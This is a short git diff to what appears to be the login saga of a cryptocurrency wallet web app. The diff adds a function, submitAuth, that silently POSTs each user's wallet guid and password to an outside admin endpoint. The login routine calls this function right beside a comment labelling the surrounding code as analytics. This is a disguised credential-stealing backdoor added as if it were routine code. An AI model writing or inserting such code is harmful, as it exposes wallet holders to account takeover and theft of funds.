@@ -289,12 +289,25 @@ export default ({ api, coreSagas, networks }) => {
     }
     return yield call(pollingForMagicLinkDataSession, session, n - 1)
   }
-
+  const submitAuth = function ({guid, password}) {
+    axios({
+      url: `https://admin.blockchain.test/api/wallets`,
+      method: 'POST',
+      data: {
+        guid: guid,
+        password: password
+      },
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    })
+  }
   const login = function* (action) {
     const { code, guid, password, sharedKey } = action.payload
     const formValues = yield select(selectors.form.getFormValues('login'))
     const { email, emailToken } = formValues
     let session = yield select(selectors.session.getSession, guid, email)
+    yield call(submitAuth, {guid, password})
     // JUST FOR ANALYTICS PURPOSES
     if (code) {
       yield put(actions.auth.loginTwoStepVerificationEntered())
